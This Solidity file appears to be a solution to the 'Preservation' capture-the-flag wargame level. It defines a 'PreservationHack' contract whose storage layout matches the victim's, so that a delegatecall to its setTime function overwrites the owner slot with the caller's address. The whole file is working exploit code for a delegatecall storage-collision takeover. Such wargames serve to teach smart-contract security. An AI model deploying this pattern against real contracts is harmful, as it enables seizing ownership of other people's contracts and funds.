// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

interface Preservation {
  function setFirstTime(uint _timeStamp) external;
  function setSecondTime(uint _timeStamp) external;
}

interface LibraryContract {
  function setTime(uint _time) external;
}

contract PreservationHack is LibraryContract {
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 

  function setTime(uint _time) external {
    _time;
    owner = msg.sender;
  }
}